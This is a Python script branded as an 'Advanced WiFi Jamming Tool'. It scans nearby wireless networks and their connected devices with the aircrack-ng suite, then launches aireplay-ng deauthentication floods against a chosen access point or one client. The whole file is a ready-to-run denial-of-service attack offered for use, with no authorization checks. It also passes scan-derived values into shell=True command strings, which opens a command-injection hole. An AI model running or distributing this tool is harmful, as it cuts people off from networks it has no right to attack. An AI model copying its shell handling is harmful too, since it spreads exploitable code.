import os
import subprocess
import time
from termcolor import colored
import signal
import sys

# Global variable to keep track of subprocesses
subprocesses = []

# Helper function to unblock and enable adapter
def unblock_adapter(adapter):
    print(colored("[*] Unblocking and enabling the WiFi adapter...", 'cyan'))
    try:
        subprocess.run(["rfkill", "unblock", "all"], check=True)
        subprocess.run(["airmon-ng", "check", "kill"], check=True)  # Stop potential interfering services
        subprocess.run(["airmon-ng", "start", adapter], check=True)  # Set the adapter to monitor mode
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] Error unblocking or enabling adapter: {e}", 'red'))

# Allow user to select WiFi adapter
def select_adapter():
    adapters = [d for d in os.listdir('/sys/class/net/') if 'wlan' in d]
    if not adapters:
        print(colored("[!] No WiFi adapters found! Make sure your WiFi is enabled.", 'red'))
        exit(1)
    
    print(colored("[*] Available WiFi Adapters:", 'cyan'))
    for i, adapter in enumerate(adapters):
        print(f"{i + 1}. {adapter}")
    choice = int(input(colored("Select adapter number: ", 'yellow')))
    
    selected_adapter = adapters[choice - 1]
    print(colored(f"[*] Using adapter: {selected_adapter}", 'green'))
    return selected_adapter

# Clean up temporary files from previous scans
def cleanup_temp_files():
    temp_files = ["/tmp/airodump-01.csv", "/tmp/airodump_devices-01.csv"]
    for temp_file in temp_files:
        if os.path.exists(temp_file):
            os.remove(temp_file)
            print(colored(f"[*] Removed temporary file: {temp_file}", 'cyan'))

# Scan for networks, filter duplicates and determine channel
def scan_networks(adapter):
    cleanup_temp_files()  # Remove any old scan files
    networks = {}  # Dictionary to store networks with their channels
    print(colored("[*] Scanning for networks using airodump-ng...", 'cyan'))
    try:
        airodump_process = subprocess.Popen(
            ["airodump-ng", adapter, "--write", "/tmp/airodump", "--output-format", "csv"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        subprocesses.append(airodump_process)  # Keep track of the process
        time.sleep(10)  # Let it scan for 10 seconds
        airodump_process.terminate()  # Stop scanning

        # Parse the CSV file generated by airodump-ng
        with open('/tmp/airodump-01.csv', 'r') as file:
            for line in file:
                if "BSSID" in line or len(line.strip()) == 0:
                    continue
                parts = line.split(',')
                if len(parts) > 13:  # Ensure there are enough columns
                    bssid = parts[0].strip()
                    essid = parts[13].strip()
                    channel = parts[3].strip()
                    if bssid and essid and channel:
                        networks[bssid] = (essid, channel)
                        print(colored(f"[*] Network found: {essid} ({bssid}) - Channel: {channel}", 'green'))
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] Error during scan: {e}", 'red'))
    except FileNotFoundError:
        print(colored(f"[!] Error: CSV file not found. Make sure airodump-ng ran correctly.", 'red'))
    return networks

# Scan for devices connected to a network
def scan_connected_devices(bssid, adapter):
    cleanup_temp_files()  # Clean up old scan results before starting a new one
    connected_devices = set()
    print(colored(f"[*] Scanning for devices connected to {bssid}...", 'cyan'))
    try:
        # Start airodump-ng to scan for connected devices
        airodump_process = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, adapter, "--write", "/tmp/airodump_devices", "--output-format", "csv"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        subprocesses.append(airodump_process)  # Keep track of the process
        time.sleep(20)  # Extend scanning time to ensure all devices are captured
        airodump_process.terminate()  # Stop scanning

        # Parse the CSV file generated by airodump-ng for connected devices
        device_section = False
        with open('/tmp/airodump_devices-01.csv', 'r') as file:
            for line in file:
                # Start parsing after the "Station MAC" section appears
                if "Station MAC" in line:
                    device_section = True
                    continue

                if device_section:
                    parts = line.split(',')
                    if len(parts) > 5:
                        device_mac = parts[0].strip()  # MAC of the connected device
                        device_bssid = parts[5].strip()  # Check if the device is associated with the target BSSID
                        if device_mac and device_bssid == bssid:
                            connected_devices.add(device_mac)
                            print(colored(f"[*] Device found: {device_mac}", 'green'))
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] Error during device scan: {e}", 'red'))
    return list(connected_devices)

# Open two terminal windows: one for airodump-ng (monitoring) and one for aireplay-ng (deauth attack)
def open_terminal_for_deauth(bssid, channel, device_mac, adapter, target_type):
    print(colored(f"[*] Opening terminals for monitoring and deauthentication attack...", 'cyan'))
    
    # Open terminal 1: airodump-ng for monitoring
    monitor_cmd = f"gnome-terminal -- bash -c 'airodump-ng {adapter} --bssid {bssid} -c {channel}; exec bash'"
    
    # Open terminal 2: aireplay-ng for deauth attack
    if target_type == "network":
        deauth_cmd = f"gnome-terminal -- bash -c 'aireplay-ng --deauth 1000 -a {bssid} {adapter}; exec bash'"
    else:  # Deauth specific device
        deauth_cmd = f"gnome-terminal -- bash -c 'aireplay-ng --deauth 1000 -a {bssid} -c {device_mac} {adapter}; exec bash'"
    
    try:
        subprocess_process1 = subprocess.Popen(monitor_cmd, shell=True)
        subprocess_process2 = subprocess.Popen(deauth_cmd, shell=True)
        subprocesses.extend([subprocess_process1, subprocess_process2])
    except subprocess.CalledProcessError as e:
        print(colored(f"[!] Error opening terminals: {e}", 'red'))

# Handle interrupt signals and clean up
def signal_handler(sig, frame):
    print(colored("\n[!] Interrupt received. Stopping all processes...", 'red'))
    for proc in subprocesses:
        proc.terminate()
    sys.exit(0)

# Main execution
def main():
    signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C
    
    print(colored("###############################################", 'green'))
    print(colored("#                  LMORRIO                    #", 'green', attrs=['bold']))
    print(colored("#          Advanced WiFi Jamming Tool         #", 'green'))
    print(colored("###############################################", 'green'))
    
    adapter = select_adapter()  # Allow user to select WiFi adapter
    unblock_adapter(adapter)  # Ensure adapter is unblocked and in monitor mode

    print(colored("[*] Starting scan and attack mode...", 'cyan'))
    try:
        networks = scan_networks(adapter)  # Scan for networks
        if not networks:
            print(colored("[!] No networks found. Retrying scan...", 'yellow'))
            time.sleep(5)  # Retry after some time
            networks = scan_networks(adapter)

        print(colored("[*] Select a network to attack:", 'cyan'))
        for i, (bssid, (essid, channel)) in enumerate(networks.items()):
            print(f"{i + 1}. {essid} ({bssid}) - Channel: {channel}")
        target_index = int(input(colored("Select network number: ", 'yellow')))
        bssid, (essid, channel) = list(networks.items())[target_index - 1]

        # Ask if the user wants to deauth the whole network or a specific device
        target_type = input(colored("Deauthenticate the whole network or a specific device? (network/device): ", 'yellow')).lower()

        if target_type == "device":
            devices = scan_connected_devices(bssid, adapter)  # Scan for connected devices
            if not devices:
                print(colored("[!] No devices found connected to this network.", 'red'))
                return
            print(colored("[*] Select a device to attack:", 'cyan'))
            for i, device in enumerate(devices):
                print(f"{i + 1}. {device}")
            device_index = int(input(colored("Select device number: ", 'yellow')))
            device_mac = devices[device_index - 1]
            open_terminal_for_deauth(bssid, channel, device_mac, adapter, target_type)

        else:  # Attack the entire network
            open_terminal_for_deauth(bssid, channel, None, adapter, "network")

    except Exception as e:
        print(colored(f"[!] An error occurred: {e}", 'red'))

if __name__ == "__main__":
    main()
